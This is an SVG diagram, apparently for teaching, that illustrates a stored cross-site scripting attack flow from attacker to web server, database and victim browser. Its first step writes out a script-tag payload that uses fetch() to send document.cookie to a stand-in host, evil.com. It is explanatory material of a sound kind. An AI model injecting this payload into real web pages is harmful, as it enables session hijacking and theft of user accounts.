<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 520" font-family="Arial, sans-serif">
  <rect x="20" y="10" width="680" height="500" rx="5" fill="#e8f4f8" stroke="#4a90e2" stroke-width="2"/>
  <text x="360" y="40" text-anchor="middle" font-size="18" font-weight="bold" fill="#333">Stored XSS Attack Flow</text>
  <text x="40" y="70" font-size="12" fill="#555">1. Attacker posts malicious comment:</text>
  <text x="55" y="88" font-size="11" fill="#dc3545">&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</text>
  <rect x="40" y="105" width="120" height="45" rx="5" fill="#f8d7da" stroke="#dc3545" stroke-width="2"/>
  <text x="100" y="133" text-anchor="middle" font-size="12" font-weight="bold" fill="#333">Attacker</text>
  <rect x="230" y="105" width="130" height="45" rx="5" fill="#fff3cd" stroke="#ffc107" stroke-width="2"/>
  <text x="295" y="133" text-anchor="middle" font-size="12" font-weight="bold" fill="#333">Web Server</text>
  <rect x="430" y="105" width="130" height="45" rx="5" fill="#d4edda" stroke="#28a745" stroke-width="2"/>
  <text x="495" y="133" text-anchor="middle" font-size="12" font-weight="bold" fill="#333">Database</text>
  <line x1="160" y1="127" x2="230" y2="127" stroke="#dc3545" stroke-width="2" marker-end="url(#ar6)"/>
  <line x1="360" y1="127" x2="430" y2="127" stroke="#dc3545" stroke-width="2" marker-end="url(#ar6)"/>
  <text x="40" y="185" font-size="12" fill="#555">2. Victim views the page with the comment</text>
  <line x1="495" y1="150" x2="495" y2="210" stroke="#4a90e2" stroke-width="1.5"/>
  <rect x="40" y="210" width="120" height="55" rx="5" fill="#fff3cd" stroke="#ffc107" stroke-width="2"/>
  <text x="100" y="233" text-anchor="middle" font-size="12" font-weight="bold" fill="#333">Victim</text>
  <text x="100" y="250" text-anchor="middle" font-size="11" fill="#555">Browser</text>
  <rect x="230" y="210" width="130" height="55" rx="5" fill="#fff3cd" stroke="#ffc107" stroke-width="2"/>
  <text x="295" y="233" text-anchor="middle" font-size="12" font-weight="bold" fill="#333">Web Server</text>
  <text x="295" y="250" text-anchor="middle" font-size="11" fill="#555">serves page</text>
  <rect x="430" y="210" width="130" height="55" rx="5" fill="#d4edda" stroke="#28a745" stroke-width="2"/>
  <text x="495" y="233" text-anchor="middle" font-size="12" font-weight="bold" fill="#333">Database</text>
  <text x="495" y="250" text-anchor="middle" font-size="11" fill="#555">returns data</text>
  <line x1="230" y1="237" x2="160" y2="237" stroke="#4a90e2" stroke-width="2" marker-end="url(#ar6b)"/>
  <line x1="430" y1="237" x2="360" y2="237" stroke="#4a90e2" stroke-width="2" marker-end="url(#ar6b)"/>
  <text x="40" y="300" font-size="12" fill="#555">3. Browser executes the script</text>
  <line x1="100" y1="265" x2="100" y2="320" stroke="#dc3545" stroke-width="1.5"/>
  <rect x="40" y="320" width="180" height="55" rx="5" fill="#f8d7da" stroke="#dc3545" stroke-width="2"/>
  <text x="130" y="343" text-anchor="middle" font-size="12" font-weight="bold" fill="#333">evil.com</text>
  <text x="130" y="363" text-anchor="middle" font-size="11" fill="#555">receives session cookie</text>
  <text x="250" y="350" font-size="12" fill="#dc3545">4. Cookie sent to attacker</text>
  <defs>
    <marker id="ar6" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-forward">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#dc3545"/>
    </marker>
    <marker id="ar6b" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-forward">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#4a90e2"/>
    </marker>
  </defs>
</svg>